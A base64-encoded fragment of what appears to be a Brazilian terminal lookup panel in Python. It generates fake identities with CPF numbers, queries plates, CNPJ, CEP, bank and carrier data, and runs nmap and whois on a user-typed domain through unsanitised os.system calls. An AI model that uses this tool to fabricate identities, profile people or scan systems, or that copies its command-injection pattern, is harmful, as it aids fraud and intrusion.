Blc3NvYSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9yYW5kb211c2VyLm1lL2FwaS8/bmF0PXt9Jy5mb3JtYXQocmFuZG9tLmNob2ljZSgnbmF0aW9uYWwnKSkpLmpzb24oKQoKICAgIHN0YXRlcyA9IFsiQUMiLCAiQUwiLCAiQVAiLCAiQU0iLCAiQkEiLCAiU1AiLCAiUkoiLCAiTVQiLCAiQ0UiLCAiREYiLCAiRVMiLCAiR08iLCAiTUEiLCAiTVMiLCAiTUciLCAiUEEiLCAiUEIiLAogICAgICAgICAgICAgICJQUiIsICJQRSIsICJQSSIsICJSTiIsICJSUyIsICJSTyIsICJSUiIsICJTQyIsICJTRSIsICJUTyJdCiAgICBzdGF0ZSA9IHJhbmRvbS5jaG9pY2Uoc3RhdGVzKQoKICAgIGVtYWlsX3Byb3ZpZGVyID0gWyJAZ21haWwuY29tIiwgIkBvdXRsb29rLmNvbSIsICJAeWFob28uY29tIiwgIkB0ZXJyYS5jb20iXQoKICAgIGVtYWlsID0gKHBlc3NvYVsncmVzdWx0cyddWzBdWyduYW1lJ11bJ2ZpcnN0J10pICsgIi4iICsgKHBlc3NvYVsncmVzdWx0cyddWzBdWyduYW1lJ11bJ2xhc3QnXSkgKyByYW5kb20uY2hvaWNlKAogICAgICAgIGVtYWlsX3Byb3ZpZGVyKQoKICAgIGlmIHBlc3NvYVsncmVzdWx0cyddWzBdWydnZW5kZXInXSA9PSAnZmVtYWxlJzoKICAgICAgICBnZW5kZXIgPSAnRicKICAgIGlmIHBlc3NvYVsncmVzdWx0cyddWzBdWydnZW5kZXInXSA9PSAnbWFsZSc6CiAgICAgICAgZ2VuZGVyID0gJ00nCiAgICBhZ2UgPSByYW5kaW50KDE4LCA4MCkKCiAgICBwcmludCgnTm9tZToge30ge30nLmZvcm1hdChwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnbmFtZSddWydmaXJzdCddLCBwZXNzb2FbJ3Jlc3VsdHMnXVswXVsnbmFtZSddWydsYXN0J10pKQogICAgcHJpbnQoJ0dlbmVybzoge30nLmZvcm1hdChnZW5kZXIpKQogICAgcHJpbnQoJ05hc2NpbWVudG86IHt9Jy5mb3JtYXQocGVzc29hWydyZXN1bHRzJ11bMF1bJ2RvYiddWydkYXRlJ11bMDoxMF0pKQogICAgcHJpbnQoJ0NQRjoge30nLmZvcm1hdChjcGZbJ2RhdGEnXVsnbnVtYmVyX2Zvcm1hdHRlZCddKSkKICAgIHByaW50KCdDUEYgc2VtIGZvcm1hdGHDp8Ojbzoge30nLmZvcm1hdChjcGZbJ2RhdGEnXVsnbnVtYmVyJ10pKQogICAgcHJpbnQoJ0UtbWFpbDoge30nLmZvcm1hdChlbWFpbCkpCiAgICBwcmludCgnQ0VQOiB7fXt9Jy5mb3JtYXQocGVzc29hWydyZXN1bHRzJ11bMF1bJ2xvY2F0aW9uJ11bJ3Bvc3Rjb2RlJ10sICctMDAwJykpCiAgICBwcmludCgnRW5kZXJlw6dvOiB7fScuZm9ybWF0KHBlc3NvYVsncmVzdWx0cyddWzBdWydsb2NhdGlvbiddWydzdHJlZXQnXVsnbmFtZSddKSkKICAgIHByaW50KCdDaWRhZGU6IHt9Jy5mb3JtYXQocGVzc29hWydyZXN1bHRzJ11bMF1bJ2xvY2F0aW9uJ11bJ2NpdHknXSkpCiAgICBwcmludCgnRXN0YWRvOiB7fScuZm9ybWF0KHBlc3NvYVsncmVzdWx0cyddWzBdWydsb2NhdGlvbiddWydzdGF0ZSddKSkKICAgIHByaW50KGYne0N9W3tZfWl7Q31dIERlc2VqYSBnZXJhciBtYWlzIHVtYSBwZXNzb2E/JykKICAgIHByaW50KGYne0N9W3tHfTF7Q31dIFNpbScpCiAgICBwcmludChmJ3tDfVt7R30ye0N9XSBOw6NvJykKICAgIGNob2ljZSA9IGlucHV0KCc9PT0+JykKICAgIGlmIGNob2ljZSA9PSAnMScgb3IgY2hvaWNlID09ICcwMSc6CiAgICAgICAgY2xlYXIoKQogICAgICAgIGdlcmFyX3Blc3NvYSh0b2tlbikKCgpkZWYgY29uc3VsdGFwbGFjYSgpOgogICAgIyBodHRwOi8vYXBpLm1hc3RlcnBsYWNhLmRldnBsYW5rLmNvbS92Mi9wbGFjYS97cGxhY2F9L2pzb24KICAgIHByaW50KGYne0N9e0d9e3Jlc3VsdH17Q30nKQogICAgcHJpbnQoZid7Q31be0d9aV17Q31EaWdpdGUgbyBudW1lcm8gZGEgcGxhY2EuJykKICAgIHBsYWNhX2lucHV0ID0gaW5wdXQoIj09PT4iKQogICAgcmVxID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaWNhcnJvcy5jb20vdjEvY29uc3VsdGEve30vanNvbicuZm9ybWF0KHBsYWNhX2lucHV0KSwgdmVyaWZ5PUZhbHNlKSAgIyBKU1E3NDM2CiAgICBwbGFjYV9kYXRhID0gcmVxLmpzb24oKQogICAgY2xlYXIoKQogICAgcHJpbnQoZid7Q317R317cmVzdWx0fXtDfScpCiAgICB0cnk6CiAgICAgICAgaWYgKHBsYWNhX2RhdGFbJ2NvZGlnb1JldG9ybm8nXSkgPT0gIjAiOgogICAgICAgICAgICBwcmludChmIntDfUFubzoge0J9e3BsYWNhX2RhdGFbJ2FubyddfXtDfSIpCiAgICAgICAgICAgIHByaW50KGYiRGF0YToge0J9e3BsYWNhX2RhdGFbJ2RhdGEnXX17Q30iKQogICAgICAgICAgICBwcmludChmIk1vZGVsbzoge0J9e3BsYWNhX2RhdGFbJ21vZGVsbyddfXtDfSIpCiAgICAgICAgICAgIHByaW50KGYiQW5vIGRvIG1vZGVsbzoge0J9e3BsYWNhX2RhdGFbJ2Fub01vZGVsbyddfXtDfSIpCiAgICAgICAgICAgIHByaW50KGYiQ29yOiB7Qn17cGxhY2FfZGF0YVsnY29yJ119e0N9IikKICAgICAgICAgICAgcHJpbnQoZiJNYXJjYToge0J9e3BsYWNhX2RhdGFbJ21hcmNhJ119e0N9IikKICAgICAgICAgICAgcHJpbnQoZiJSb3Viby9mdXJ0bzoge0J9e3BsYWNhX2RhdGFbJ2RhdGFBdHVhbGl6YWNhb1JvdWJvRnVydG8nXX17Q30iKQogICAgICAgICAgICBwcmludChmIlNpdHVhw6fDo286IHtCfXtwbGFjYV9kYXRhWydzaXR1YWNhbyddfXtDfSIpCiAgICAgICAgICAgIHByaW50KGYiUGxhY2E6IHtCfXtwbGFjYV9kYXRhWydwbGFjYSddfXtDfSIpCiAgICAgICAgICAgIHByaW50KGYiQ2hhc3NpOiB7Qn17cGxhY2FfZGF0YVsnY2hhc3NpJ119e0N9IikKICAgICAgICAgICAgcHJpbnQoZiJVRjoge0J9e3BsYWNhX2RhdGFbJ3VmJ119e0N9IikKICAgICAgICAgICAgcHJpbnQoZiJNdW5pY8OtcGlvOiB7Qn17cGxhY2FfZGF0YVsnbXVuaWNpcGlvJ119e0N9IikKICAgICAgICAgICAgcHJpbnQoZiJNb2RpZmljYWRhIGVtOiB7Qn17cGxhY2FfZGF0YVsnZGF0YUF0dWFsaXphY2FvQ2FyYWN0ZXJpc3RpY2FzVmVpY3VsbyddfXtDfSIpCiAgICAgICAgICAgIHByaW50KGYiQWxhcm1lIGF0dWFsaXphZG86IHtCfXtwbGFjYV9kYXRhWydkYXRhQXR1YWxpemFjYW9BbGFybWUnXX17Q30iKQogICAgICAgICAgICBwcmludChmIk1lbnNhZ2VtIGRlIHJldG9ybm86IHtCfXtwbGFjYV9kYXRhWydtZW5zYWdlbVJldG9ybm8nXX17Q30iKQogICAgICAgICAgICBwcmludChmIkPDs2RpZ28gZGUgcmV0b3Jubzoge0J9e3BsYWNhX2RhdGFbJ2NvZGlnb1JldG9ybm8nXX17Q30iKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHByaW50KGYne0N9W3tSfWlde0N9IFNlbSBkYWRvcyBzb2JyZS4nKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KGYne0N9W3tSfUVSUk9Se0N9XSBQbGFjYSBpbnZhbGlkYScpCiAgICAgICAgdGltZS5zbGVlcCgzKQogICAgZGVsIHBsYWNhX2RhdGEKICAgIGRlbCByZXEKICAgIGRlbCBwbGFjYV9pbnB1dAogICAgcHJpbnQoZid7Q31be0d9aXtDfV0gRGVzZWphIHJlYWxpemFyIHVtYSBub3ZhIGNvbnN1bHRhPycpCiAgICBwcmludCgnMS5TaW0nKQogICAgcHJpbnQoJzIuTsOjbycpCiAgICBjaG9pY2UgPSBpbnB1dCgiPT09PiIpCiAgICBpZiBjaG9pY2UgPT0gIjEiIG9yIGNob2ljZSA9PSAiMDEiOgogICAgICAgIGNvbnN1bHRhcGxhY2EoKQogICAgaWYgY2hvaWNlID09ICIyIiBvciBjaG9pY2UgPT0gIjAyIjoKICAgICAgICBwYXNzCiAgICBlbHNlOgogICAgICAgIHByaW50KCJPcGNhbyBpbnZhbGlkYS4iKQoKCmRlZiBjbnModG9rZW4sIGFuaW0pOgogICAgcHJpbnQoZid7Q317R317cmVzdWx0fXtDfScpCiAgICBwcmludChmJycnCntDfVt7R31pe0N9XUZvcm1hcyBkZSBvcGVyYcOnw6NvClt7R30xe0N9XUdlcmFyIENOUwpbe0d9MntDfV1Db25zdWx0YXIgQ05TCicnJykKICAgIGNob2ljZSA9IGlucHV0KCc9PT0+JykKICAgIGNsZWFyKCkKICAgIGlmIGNob2ljZSA9PSAnMScgb3IgY2hvaWNlID09ICcwMSc6CiAgICAgICAgcHJpbnQoZid7Q31be0d9aXtDfV0gR2VyYW5kbyBDTlMnKQogICAgICAgIGNucyA9IHJlcXVlc3RzLnJlcXVlc3QoJ0dFVCcsICdodHRwOi8vZ2VyYWRvcmFwcC5jb20vYXBpL3YxL2Nucy9nZW5lcmF0ZT90b2tlbj17fScuZm9ybWF0KHRva2VuWzBdKSkuanNvbigpCiAgICAgICAgY25zMiA9IGNuc1snZGF0YSddWydudW1iZXJfZm9ybWF0dGVkJ10KICAgICAgICBlbnRyYWRhID0gY25zWydkYXRhJ11bJ251bWJlciddCiAgICAgICAgcHJpbnQoZid7Q31be1l9aXtDfV0gTyBDTlMgZ2VyYWRvIGZvaTogJyArIGNuczIpCiAgICAgICAgaWYgYW5pbSA9PSAxOgogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgcHJpbnQoZid7Q31be0d9aXtDfV0gQ29uc3VsdGFuZG8gQ05TLi4uJykKICAgIGlmIGNob2ljZSA9PSAnMicgb3IgY2hvaWNlID09ICcwMic6CiAgICAgICAgZW50cmFkYSA9IGlucHV0KCc9PT0+JykKICAgIGlmIGFuaW0gPT0gMToKICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICBjbGVhcigpCiAgICBjbnNfZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2dlcmFkb3JhcHAuY29tL2FwaS92MS9jbnMvdmFsaWRhdGUve30/dG9rZW49e30nLmZvcm1hdChlbnRyYWRhLCB0b2tlblswXSkpLmpzb24oKQogICAgdHJ5OgogICAgICAgIHByaW50KCdOdW1lcm86IHt9Jy5mb3JtYXQoY25zX2RhdGFbImRhdGEiXVsibnVtYmVyIl0pKQogICAgICAgIHByaW50KCdNZW5zYWdlbToge30nLmZvcm1hdChjbnNfZGF0YVsiZGF0YSJdWyJtZXNzYWdlIl0pKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KGYne0N9W3tSfSp7Q31dIENOUyBJTlZBTElETy4nKQogICAgcHJpbnQoZiJ7Q317R31ERVNFSkEgUkVBTElaQVIgVU1BIE5PVkEgQ09OU1VMVEE/e0N9IikKICAgIHByaW50KGYie0N9e0d9WzFde0N9IFNpbSIpCiAgICBwcmludChmIntDfXtHfVsyXXtDfSBOw6NvIikKICAgIGxvID0gaW5wdXQoJz09PT4gJykKICAgIGlmIGxvID09ICcxJyBvciBsbyA9PSAnMDEnOgogICAgICAgIGNucyh0b2tlbiwgYW5pbSkKCgpkZWYgY2VwKGFuaW0pOgogICAgY2xlYXIoKQogICAgcHJpbnQoZid7Q317R317cmVzdWx0fXtDfScpCiAgICBwcmludChmJ3tDfVt7R31pe0N9XSBJbmZvcm1lIG8gQ0VQLicpCiAgICBjZXBfaW5wdXQgPSBpbnB1dCgiPT09PiIpCiAgICBpZiBsZW4oY2VwX2lucHV0KSAhPSA4OgogICAgICAgIHByaW50KGYie0N9W3tSfUVSUk9Se0N9XSBRVUFOVElEQURFIERFIERJR0lUT1MgSU5WQUxJREEiKQogICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICBjZXAoYW5pbSkKCiAgICByZXF1ZXN0ID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL3ZpYWNlcC5jb20uYnIvd3Mve30vanNvbi8nLmZvcm1hdChjZXBfaW5wdXQpKQoKICAgIGFkcmVzc19kYXRhID0gcmVxdWVzdC5qc29uKCkKICAgIGNsZWFyKCkKICAgIHRyeToKICAgICAgICBwcmludChyZXN1bHQpCiAgICAgICAgcHJpbnQoJ0NlcDoge30nLmZvcm1hdChhZHJlc3NfZGF0YVsnY2VwJ10pKQogICAgICAgIHByaW50KCdMb2dyYWRvdXJvOiB7fScuZm9ybWF0KGFkcmVzc19kYXRhWydsb2dyYWRvdXJvJ10pKQogICAgICAgIHByaW50KCdDb21wbGVtZW50bzoge30nLmZvcm1hdChhZHJlc3NfZGF0YVsnY29tcGxlbWVudG8nXSkpCiAgICAgICAgcHJpbnQoJ0JhaXJybzoge30nLmZvcm1hdChhZHJlc3NfZGF0YVsnYmFpcnJvJ10pKQogICAgICAgIHByaW50KCdDaWRhZGU6IHt9Jy5mb3JtYXQoYWRyZXNzX2RhdGFbImxvY2FsaWRhZGUiXSkpCiAgICAgICAgcHJpbnQoJ0VzdGFkbzoge30nLmZvcm1hdChhZHJlc3NfZGF0YVsndWYnXSkpCiAgICAgICAgcHJpbnQoJ0lCR0U6IHt9Jy5mb3JtYXQoYWRyZXNzX2RhdGFbJ2liZ2UnXSkpCiAgICAgICAgcHJpbnQoJ0dJQToge30nLmZvcm1hdChhZHJlc3NfZGF0YVsnZ2lhJ10pKQogICAgICAgIHByaW50KCdTSUFGSToge30nLmZvcm1hdChhZHJlc3NfZGF0YVsnc2lhZmknXSkpCiAgICAgICAgcHJpbnQoJ0RERDoge30nLmZvcm1hdChhZHJlc3NfZGF0YVsnZGRkJ10pKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KGYne0N9W3tSfUVSUk9Se0N9XSBDRVAgSU5WQUxJRE8uJykKICAgIHByaW50KGYie0N9e0d9REVTRUpBIFJFQUxJWkFSIFVNQSBOT1ZBIENPTlNVTFRBP3tDfSIpCiAgICBwcmludChmIntDfVt7R30xe0N9XSBTaW0iKQogICAgcHJpbnQoZiJ7Q31be0d9MntDfV0gTsOjbyIpCiAgICBvcHRpb24gPSBpbnB1dCgnPT09PiAnKQogICAgaWYgb3B0aW9uID09ICcxJzoKICAgICAgICBjZXAoYW5pbSkKICAgIGlmIG9wdGlvbiA9PSAnMic6CiAgICAgICAgcGFzcwogICAgZWxzZToKICAgICAgICBwcmludChmJ3tDfVt7Un1pe0N9XSBPcMOnw6NvIGludsOhbGlkYScpCiAgICAgICAgdGltZS5zbGVlcCgyKQogICAgICAgIHBhc3MKCgpkZWYga2lueV9pbmZvZ2EoKToKICAgIG9zLnN5c3RlbSgiYXB0IGluc3RhbGwgbm1hcCB3aG9pcyIpCiAgICBjbGVhcigpCiAgICBwcmludChmJ3tDfXtHfXtyZXN1bHR9e0N9JykKICAgIHByaW50KCkKICAgIGogPSBpbnB1dCgiMSBwYXJhIEhUVFBTLCAyIHBhcmEgSFRUUDoiKQogICAgayA9IGlucHV0KCJEb21haW46ICIpCiAgICBpZiBqID09ICcxJzoKICAgICAgICBwcmludCgiVVJMOiAiImh0dHBzOi8vd3d3LiIgKyBrKQogICAgICAgIG9zLnN5c3RlbSgibm1hcCAiICsgaykKICAgICAgICBvcy5zeXN0ZW0oIndob2lzICIgKyBrKQogICAgcHJpbnQoKQogICAgaWYgaiA9PSAnMic6CiAgICAgICAgcHJpbnQoIlVSTDogIiJodHRwOi8vd3d3LiIgKyBrKQogICAgICAgIG9zLnN5c3RlbSgibm1hcCAiICsgaykKICAgICAgICBvcy5zeXN0ZW0oIndob2lzICIgKyBrKQogICAgcHJpbnQoIlByZXNzaW9uZSBlbnRlciBwYXJhIHZvbHRhci4iKQogICAgcGF1c2UgPSBpbnB1dCgiPT09PT4iKQoKCmRlZiBjbnBqKGtjdCwgdG9rZW4sIGFuaW0pOgogICAgY2xlYXIoKQogICAgaWYga2N0ID09ICcxJyBvciBrY3QgPT0gJzAxJzoKICAgICAgICBnZW4gPSAiMSIKICAgIGVsaWYga2N0ID09ICcyJyBvciBrY3QgPT0gJzAyJzoKICAgICAgICBwcmludChmJ3tDfXtHfXtyZXN1bHR9e0N9JykKICAgICAgICBwcmludCgiRElHSVRFIE8gQ05QSiBTRU0gLyAuIE9VIC0iKQogICAgICAgIGNucGpfaW5wdXQgPSBpbnB1dCgiPT09PiIpCiAgICAgICAgZ2VuID0gMAogICAgZWxzZToKICAgICAgICBwcmludCgnT3DDp8OjbyBpbnbDoWxpZGEnKQogICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICBjbnBqKHRva2VuLCBhbmltKQogICAgaWYgZ2VuID09ICIxIjoKICAgICAgICBwcmludChmJ3tDfVt7R30qe0N9XSBHZXJhbmRvIENOUEouLi4nKQogICAgICAgIGlmIGFuaW0gPT0gJzEnOgogICAgICAgICAgICB0aW1lLnNsZWVwKDEpCiAgICAgICAgY25wal9kYXRhID0gcmVxdWVzdHMuZ2V0KCdodHRwOi8vZ2VyYWRvcmFwcC5jb20vYXBpL3YxL2NucGovZ2VuZXJhdGU/dG9rZW49e30nLmZvcm1hdCh0b2tlblswXSkpLmpzb24oKQogICAgICAgIGNucGpfaW5wdXQgPSAoY25wal9kYXRhWydkYXRhJ11bJ251bWJlciddKQogICAgICAgIGNucGpfZm9ybWF0dGVkID0gKGNucGpfZGF0YVsnZGF0YSddWydudW1iZXJfZm9ybWF0dGVkJ10pCiAgICAgICAgcHJpbnQoZid7Q31be1l9aXtDfV0gTyBDTlBKIGdlcmFkbyBmb2k6IHtjbnBqX2Zvcm1hdHRlZH0nKQogICAgcHJpbnQoZid7Q31be0d9aXtDfV0gQ29uc3VsdGFuZG8gQ05QSi4uLiAnKQogICAgdHJ5OgogICAgICAgIGNucGpfZGF0YSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly93d3cucmVjZWl0YXdzLmNvbS5ici92MS9jbnBqL3t9Jy5mb3JtYXQoY25wal9pbnB1dCkpLmpzb24oKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KGYne0N9W3tSfSp7Q31dRXJybyBubyBzZXJ2aWRvcicpCiAgICAgICAgY25wal9kYXRhID0gIm1lc3NhZ2UiCgogICAgaWYgJ21lc3NhZ2UnIG5vdCBpbiBjbnBqX2RhdGE6CiAgICAgICAgdGFnYWluID0gJzAnCiAgICAgICAgcHJpbnQoIkNOUEo6IHt9Ii5mb3JtYXQoY25wal9kYXRhWydjbnBqJ10pKQogICAgICAgIHByaW50KCJBdGl2aWRhZGUgcHJpbmNpcGFsOiB7fSIuZm9ybWF0KGNucGpfZGF0YVsnYXRpdmlkYWRlX3ByaW5jaXBhbCddWzBdWyd0ZXh0J10pKQogICAgICAgIHByaW50KCJOb21lOiB7fSIuZm9ybWF0KGNucGpfZGF0YVsnbm9tZSddKSkKICAgICAgICBwcmludCgiQ0VQOiB7fSIuZm9ybWF0KGNucGpfZGF0YVsnY2VwJ10pKQogICAgICAgIHRyeToKICAgICAgICAgICAgcHJpbnQoIlRlbGVmb25lOiB7fSIuZm9ybWF0KGNucGpfZGF0YVsndGVsZWZvbmUnXSkpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBwcmludCgiRW1haWw6IHt9Ii5mb3JtYXQoY25wal9kYXRhWydlbWFpbCddKSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICBwcmludCgiU2l0dWHDp8Ojbzoge30iLmZvcm1hdChjbnBqX2RhdGFbJ3NpdHVhY2FvJ10pKQogICAgICAgIHByaW50KCJVRjoge30iLmZvcm1hdChjbnBqX2RhdGFbJ3VmJ10pKQogICAgICAgIHByaW50KCJNdW5pY2lwaW86IHt9Ii5mb3JtYXQoY25wal9kYXRhWydtdW5pY2lwaW8nXSkpCiAgICAgICAgcHJpbnQoIkxvZ3JhZG91cm86IHt9Ii5mb3JtYXQoY25wal9kYXRhWydsb2dyYWRvdXJvJ10pKQogICAgICAgIHByaW50KCJOdW1lcm86IHt9Ii5mb3JtYXQoY25wal9kYXRhWydudW1lcm8nXSkpCiAgICAgICAgcHJpbnQoIkNvbXBsZW1lbnRvOiB7fSIuZm9ybWF0KGNucGpfZGF0YVsnY29tcGxlbWVudG8nXSkpCiAgICAgICAgcHJpbnQoIlBvcnRlOiB7fSIuZm9ybWF0KGNucGpfZGF0YVsncG9ydGUnXSkpCiAgICAgICAgcHJpbnQoIk5hdHVyZXphOiB7fSIuZm9ybWF0KGNucGpfZGF0YVsnbmF0dXJlemFfanVyaWRpY2EnXSkpCiAgICAgICAgcHJpbnQoIkRhdGEgZGUgYWJlcnR1cmE6IHt9Ii5mb3JtYXQoY25wal9kYXRhWydhYmVydHVyYSddKSkKICAgICAgICBwcmludCgiVGlwbzoge30iLmZvcm1hdChjbnBqX2RhdGFbJ3RpcG8nXSkpCiAgICAgICAgcHJpbnQoIkNhcGl0YWw6IHt9Ii5mb3JtYXQoY25wal9kYXRhWydjYXBpdGFsX3NvY2lhbCddKSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09IikKICAgICAgICAgICAgcHJpbnQoInBlc3NvYWw6IHt9Ii5mb3JtYXQoY25wal9kYXRhWydxc2EnXVswXVsnbm9tZSddKSkKICAgICAgICAgICAgcHJpbnQoIkNhcmdvOiB7fSIuZm9ybWF0KGNucGpfZGF0YVsncXNhJ11bMF1bJ3F1YWwnXSkpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCiAgICAgICAgdHJ5OgogICAgICAgICAgICBwcmludCgicGVzc29hbDoge30iLmZvcm1hdChjbnBqX2RhdGFbJ3FzYSddWzFdWydub21lJ10pKQogICAgICAgICAgICBwcmludCgiQ2FyZ286IHt9Ii5mb3JtYXQoY25wal9kYXRhWydxc2EnXVsxXVsncXVhbCddKSkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICB0cnk6CiAgICAgICAgICAgIHByaW50KCJQZXNzb2FsOiB7fSIuZm9ybWF0KGNucGpfZGF0YVsncXNhJ11bMl1bJ25vbWUnXSkpCiAgICAgICAgICAgIHByaW50KCJDYXJnbzoge30iLmZvcm1hdChjbnBqX2RhdGFbJ3FzYSddWzJdWydxdWFsJ10pKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcGFzcwogICAgZWxzZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHByaW50KGYne0N9W3tSfUVSUk9Se0N9XScgKyAne306IENOUEogSU5WQUxJRE8uJy5mb3JtYXQoY25wal9mb3JtYXR0ZWQpKQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZid7Q31be1J9RVJST1J7Q31dIFNlbSBkYWRvcy4nKQogICAgICAgIGlmIGdlbiA9PSAnMSc6CiAgICAgICAgICAgIGRlbCBjbnBqX2RhdGEKICAgICAgICAgICAgZGVsIGNucGpfaW5wdXQKICAgICAgICAgICAgZGVsIGNucGpfZm9ybWF0dGVkCiAgICAgICAgICAgIHRhZ2FpbiA9ICcxJwogICAgICAgICAgICBwcmludChmJ3tDfVt7WX1pe0N9XVRlbnRhbmRvIG5vdmFtZW50ZS4uLicpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMykKICAgICAgICAgICAgY25waihrY3QsIHRva2VuLCBhbmltKQogICAgaWYgdGFnYWluID09ICcwJzoKICAgICAgICBwcmludChmIntDfVt7WX1pe0N9XSBERVNFSkEgUkVBTElaQVIgVU1BIE5PVkEgQ09OU1VMVEE/IikKICAgICAgICBwcmludChmIntDfVt7R30xe0N9XSBTaW0iKQogICAgICAgIHByaW50KGYie0N9W3tHfTJ7Q31dIE7Do28iKQogICAgICAgIGxvID0gaW5wdXQoJz09PT4gJykKICAgICAgICBpZiBsbyA9PSAnMScgb3IgbG8gPT0gJzAxJzoKICAgICAgICAgICAgY25waihrY3QsIHRva2VuLCBhbmltKQoKCmRlZiBiYW5rKGFuaW0pOgogICAgY2xlYXIoKQogICAgcHJpbnQoZid7Q317R317cmVzdWx0fXtDfScpCiAgICBwcmludChmIntDfVt7R31pe0N9XSBESUdJVEUgTyBDT0RJR08gQkFOQ0FSSU8iKQogICAgcHJpbnQoZiJ7Q31be0d9aXtDfV0gRXhlbXBsbzogMjYwIikKICAgIGJhbmtfaW5wdXQgPSBpbnB1dCgiPT09PT0+IikKICAgIGNsZWFyKCkKICAgIGlmIGFuaW0gPT0gJzEnOgogICAgICAgIHByaW50KGYne0N9W3tHfWl7Q31dIENvbnN1bHRhbmRvIGJhbmNvLicpCiAgICAgICAgdGltZS5zbGVlcCgxKQogICAgdHJ5OgogICAgICAgIHJlcSA9IHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9icmFzaWxhcGkuY29tLmJyL2FwaS9iYW5rcy92MS97fScuZm9ybWF0KGJhbmtfaW5wdXQpKQoKICAgICAgICBiYW5rX2RhdGEgPSByZXEuanNvbigpCgogICAgICAgIGlmICdtZXNzYWdlJyBub3QgaW4gYmFua19kYXRhOgogICAgICAgICAgICBvcy5zeXN0ZW0oImZpZ2xldCBLSU5ZIikKICAgICAgICAgICAgcHJpbnQoIkPDs2RpZ28gYmFuY8OhcmlvOiB7fSIuZm9ybWF0KGJhbmtfZGF0YVsnY29kZSddKSkKICAgICAgICAgICAgcHJpbnQoIk5vbWU6IHt9Ii5mb3JtYXQoYmFua19kYXRhWyduYW1lJ10pKQogICAgICAgICAgICBwcmludCgiTm9tZSBjb21wbGV0bzoge30iLmZvcm1hdChiYW5rX2RhdGFbJ2Z1bGxOYW1lJ10pKQogICAgICAgICAgICBwcmludCgiSVNQQjoge30iLmZvcm1hdChiYW5rX2RhdGFbJ2lzcGInXSkpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoJ3t9OiBDw7NkaWdvIGJhbmPDoXJpbyBpbnbDoWxpZG8uJy5mb3JtYXQoYmFua19pbnB1dCkpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoZid7Q31be1J9RVJST1J7Q31dRXJybyBubyBzZXJ2aWRvcicpCiAgICBwcmludChmIntDfVt7WX1pe0N9XSBERVNFSkEgQ09OU1VMVEFSIFVNIE5PVk8gQ09ESUdPIEJBTkNBUklPPyAiKQogICAgcHJpbnQoZiJ7Q31be0d9MXtDfV0gU2ltIikKICAgIHByaW50KGYie0N9W3tHfTJ7Q31dIE7Do28iKQogICAga2MgPSBpbnB1dCgiPT09PiAiKQogICAgaWYga2MgPT0gJzAxJyBvciBrYyA9PSAnMSc6CiAgICAgICAgYmFuayhhbmltKQoKZGVmIGNvbnN1bHRhb3BlcmFkb3JhKCk6CiAgICBwcmludChmJ3tDfXtHfXtyZXN1bHR9e0N9JykKICAgIHByaW50KGYne0N9W3tHfWl7Q31dIEV4ZW1wbG86IDQ4OTUyMDIxODI2JykKICAgIHByaW50KGYne0N9W3tZfWl7Q31dIExpbWl0ZSBkZSBjb25zdWx0YXM6IDYgY29uc3VsdGFzIHBvciBob3JhLicpCiAgICBwcmludChmJ3tDfVt7WX1pe0N9XSBEaWdpdGUgbyBudW1lcm8gY29tIERERC4nKQogICAgb3BfaW5wdXQgPSBpbnB1dCgiPT09PiIpCiAgICBjbGVhcigpCiAgICBwcmludChyZXN1bHQpCiAgICBoZWFkZXJzID0gewogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChNYWNpbnRvc2g7IEludGVsIE1hYyBPUyBYIDEwXzE1XzQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84My4wLjQxMDMuOTcgU2FmYXJpLzUzNy4zNiJ9CiAgICB0cnk6CiAgICAgICAgcmVxdWVzdCA9IHJlcXVlc3RzLmdldCgnaHR0cDovL2ZyZWUudGVsZWluLmNvbS5ici9zaXN0ZW1hL2NvbnN1bHRhX2pzb24ucGhwP2NoYXZlPXNlbmhhc2l0ZSZudW1lcm89JyArIG9wX2lucHV0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaGVhZGVycz1oZWFkZXJzKQogICAgICAgIG9wX2RhdGEgPSByZXF1ZXN0Lmpzb24oKQogICAgZXhjZXB0OgogICAgICAgIHByaW50KGYne0N9W3tSfWl7Q31dIExpbWl0ZSBkZSBjb25zdWx0YXMgYXRpbmdpZG8nKQogICAgICAgIHByaW50KGYne0N9W3tZfWl7Q31dIERlc2VqYSBmYXplciB1bWEgbm92YSBjb25zdWx0YT8nKQogICAgICAgIHByaW50KCcxLlNpbScpCiAgICAgICAgcHJpbnQoJzIuTsOjbycpCiAgICAgICAgY2hvID0gaW5wdXQoIj09PT4iKQogICAgICAgIGlmIGNobyA9PSAnMScgb3IgY2hvID09ICcwMSc6CiAgICAgICAgICAgIGNvbnN1bHRhb3BlcmFkb3JhKCkKICAgICAgICBlbGlmIGNobyA9PSAnMicgb3IgY2hvID09ICcwMic6CiAgICAgICAgICAgIHBhc3MKIC